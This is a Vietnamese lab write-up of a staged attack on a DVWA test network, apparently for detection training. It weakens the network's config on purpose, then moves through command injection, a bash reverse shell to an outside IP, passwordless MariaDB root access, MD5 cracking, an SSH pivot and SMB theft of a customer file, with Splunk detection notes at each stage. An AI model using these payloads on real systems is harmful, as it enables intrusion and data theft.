# Kịch bản tấn công

## 1. Lỏng config để dễ tấn công

### FW Rules

- Thêm rule cho phép outbound TCP dport 22 từ interface `eth1`, `eth2`, `eth3`.
- Thêm rule cho phép outbound ICMP echo request từ interface `eth1`, `eth2`, `eth3`.

→ Chạy 2 lệnh sau trên FW:

```
nft insert rule inet filter forward iifname '{ "eth1", "eth2", "eth3" }' icmp type echo-request accept
nft insert rule inet filter forward iifname '{ "eth1", "eth2", "eth3" }' tcp dport 22 accept
```

### Cho phép login DB trong DVWA bằng user root mà không cần PW

Chạy lệnh sau trên MariaDB của web:

`ALTER USER 'root'@'localhost' IDENTIFIED BY '';`

### Thêm user `nhanvien1` với hash của PW vào trong DB của DVWA

Chạy lệnh sau trên MariaDB của web:

```sql
INSERT INTO users (
    user_id,
    first_name,
    last_name,
    user,
    password,
    avatar,
    last_login,
    failed_login,
    role,
    account_enabled
)
VALUES (
    6,
    'Nhan',
    'Vien',
    'nhanvien1',
    'd0970714757783e6cf17b26fb8e2298f',
    '/DVWA/hackable/users/nhanvien1.jpg',
    NOW(),
    0,
    'user',
    1
);
```
### Thêm IP của SRV01 trong file `.smbcred` của `CL01`

![alt text](images/image-13.png)

## 2. Kịch bản tấn công

Giả sử DVWA là một trang public, cho phép sign up, vì thế ta có credential.

## Stage 1

![alt text](images/image-3.png)

Ta thấy có một tính năng ping: nhập IP vào và trả về kết quả của lệnh ping tới IP đó.

![alt text](images/image-4.png)

Từ đó, ta thử payload `8.8.8.8;pwd` để kiểm tra có thể thực hiện command injection không.

![alt text](images/image-5.png)
→ Kết quả trả về có output của lệnh `pwd`, tức thực hiện command injection thành công.

Từ đó ta sẽ chèn payload kết nối reverse shell đến bản thân.

Ta thử payload `127.0.0.1;bash -c "bash -i >& /dev/tcp/192.168.245.100/443 0>&1"` thì không thấy kết nối đến port 4444 và response HTTP service của target bị timeout.

→ Đoán được rằng có thể FW chặn target kết nối ra ngoài, tuy nhiên thử open port 443 thay vì 4444, vì thường sẽ mở port 443 ra để internal truy cập web.

→ Vì thế ta sử dụng payload sau `127.0.0.1;bash -c "bash -i >& /dev/tcp/192.168.245.100/443 0>&1"` và open port 443 tương ứng thì ta có được reverse shell thành công với user `www-data`.

![alt text](images/image-6.png)

Ta thực hiện như sau để stabilize reverse shell:

```
# Target
python3 -c 'import pty; pty.spawn("/bin/bash")'

Press Ctrl+Z

# Local machine
stty raw -echo; fg

Press Enter
```

**Log có thể phát hiện trên Splunk:** log từ web: web kết nối đến IP bên ngoài; với data gửi đi không là HTTP request.

## Stage 2

Ta kiểm tra các internal service của target.

![alt text](images/image-7.png)
→ Thấy được target mở port 3306 ở localhost, default port của MariaDB.

Ta thử connect đến MariaDB server bằng user `root` (user mặc định của MariaDB) thì kết nối thành công mà không cần password.

![alt text](images/image-8.png)

**Log có thể phát hiện trên Splunk:** log của DB trong web: login bằng user root ở thời gian không phải giờ hành chính.

## Stage 3

Kiểm tra các DB và table tương ứng thì ta thấy được các credential của các user trong table users trong database `dvwa`.

![alt text](images/image-9.png)

Ta thử dùng một tool hash crack bất kỳ để crack các hash PW này thì ta biết được hash sử dụng là MD5 và các password tương ứng.

![alt text](images/image-10.png)

Ta có được list các credential của các user là:

- admin: password
- gordonb: abc123
- 1337: charley
- pablo: letmein
- smithy: password
- nhanvien1: 112233

**Log có thể phát hiện trên Splunk:** không có.

## Stage 4

Thử recon target thì đọc được access log đến target trong `/var/log/apache2/access.log`.

![alt text](images/image-11.png)
→ Ta thấy được có một IP `10.10.10.11` query đến target, đây là một IP private.

→ Đoán được đây là internal host trong mạng của WEB01.

**Log có thể phát hiện trên Splunk:** không có.

## Stage 5

Ta thử dùng list các credential có được trong `dvwa` để thử SSH đến `10.10.10.11` thì thành công với `nhanvien1: 112233`.

![alt text](images/image-12.png)

**Log có thể phát hiện trên Splunk:** SSH trong thời gian không phải thời gian hành chính/kết nối SSH ra ngoài từ web (một machine thường không kết nối SSH ra ngoài).

## Stage 6

Ta thực hiện enumerate thì thấy được có file `.smbcred` như sau:

![alt text](images/image-13.png)

→ Ta sử dụng `smbclient` kết nối đến `10.10.10.10`.

![alt text](images/image-15.png)

Ta có được file `khachhang.csv` chứa thông tin khách hàng của target.

![alt text](images/image-16.png)

**Log có thể phát hiện trên Splunk:** kết nối SMB từ `10.10.10.11` trong thời gian không phải là giờ hành chính.
